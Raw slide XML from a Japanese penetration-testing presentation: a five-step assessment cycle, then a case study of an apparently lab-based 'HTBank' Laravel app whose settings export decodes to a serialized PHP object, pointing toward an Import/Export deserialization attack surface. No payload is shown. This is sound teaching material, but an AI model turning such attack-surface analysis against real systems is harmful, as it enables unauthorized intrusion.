          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7346950" y="1714500"/>
            <a:ext cx="1818259" cy="203200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3E6FBD"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>STEP 4</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7346950" y="1968500"/>
            <a:ext cx="1818259" cy="200620"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1380"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>差分の観測</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7346950" y="2219920"/>
            <a:ext cx="1818259" cy="363141"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1330"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A5058"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>1バイト変更・型変更・長さ変更時のエラー／挙動差を記録</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9347200" y="1555750"/>
            <a:ext cx="2032000" cy="1397000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6364"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="14171A"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9474200" y="1708150"/>
            <a:ext cx="1831340" cy="203200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3E6FBD"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>STEP 5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9474200" y="1962150"/>
            <a:ext cx="1831340" cy="200620"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1380"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>無害な検証</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9474200" y="2213570"/>
            <a:ext cx="1831340" cy="363141"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1330"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C2C9"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>成立性を無害な方法で証明してから影響評価へ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Shape 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="815975" y="3260725"/>
            <a:ext cx="10560050" cy="439341"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16621"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFF4E8"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E08A3C"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="24" name="Image 0" descr="Lightbulb">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2989064" y="3391495"/>
            <a:ext cx="177800" cy="177800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Text 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3268464" y="3378200"/>
            <a:ext cx="7121366" cy="229791"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1610"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8A4B15"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>このサイクルは一周では終わらない：STEP4の結果次第でSTEP1〜2に戻り、他の入力点を再調査する</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="11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6F2"/>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A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>ケーススタディ：HTBank GmbH</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Shape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="815975" y="1537295"/>
            <a:ext cx="5406231" cy="4301530"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2288"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E2E0D9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1047750" y="1769070"/>
            <a:ext cx="5090962"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A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>依頼内容</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1047750" y="2096691"/>
            <a:ext cx="5090962" cy="497681"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1860"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A5058"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>新規Webサイトのホワイトボックス評価。提供物はURL・ソースコード、そして「@htbank.com は管理者用ドメインのためアカウント作成不可」というヒント</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1047750" y="2683272"/>
            <a:ext cx="5090962"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A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>発見した機能</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1146556" y="3010892"/>
            <a:ext cx="4984536" cy="756741"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" marL="155194" indent="-155194">
              <a:lnSpc>
                <a:spcPts val="1920"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A5058"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>ユーザー登録・ログイン（@htbank.comドメインは拒否）</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="155194" indent="-155194">
              <a:lnSpc>
                <a:spcPts val="1920"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A5058"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>/settings：ユーザー名・メール・パスワード・写真更新</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="155194" indent="-155194">
              <a:lnSpc>
                <a:spcPts val="1920"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A5058"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Import / Export Settings（Base64文字列の入出力）</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6428581" y="1534120"/>
            <a:ext cx="4950619" cy="4307880"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2358"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="14171A"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6657181" y="1762720"/>
            <a:ext cx="4628221" cy="220960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1540"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E08A3C"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Export Settingsの出力をデコード</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6660356" y="2050355"/>
            <a:ext cx="4487069" cy="1199852"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5028"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1D2126"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="2B3036"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="99806" tIns="99806" rIns="0" bIns="74406" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1520"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>O:24:"App\Helpers\UserSettings":4:{</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1520"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>s:30:"...Name";s:7:"pentest";</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1520"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>s:31:"...Email";s:16:"pentest@test.com";</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1520"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>s:34:"...Password";s:60:"$2y$10$...";</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1520"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>s:36:"...ProfilePic";s:11:"default.jpg";}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6657181" y="3342283"/>
            <a:ext cx="4628221" cy="225425"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1575"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C2C9"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>シリアライズされたPHPオブジェクト（Laravel）— App\Helpers\UserSettings</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="10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6F2"/>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63550"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="3450"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>攻撃面分析：Export / Import</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="1758255"/>
            <a:ext cx="939800" cy="220960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1540"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3E6FBD"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>EXPORT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Image 0" descr="rect">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1828800" y="1504950"/>
            <a:ext cx="1016000" cy="482600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1775777" y="2038350"/>
            <a:ext cx="1122045" cy="194270"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
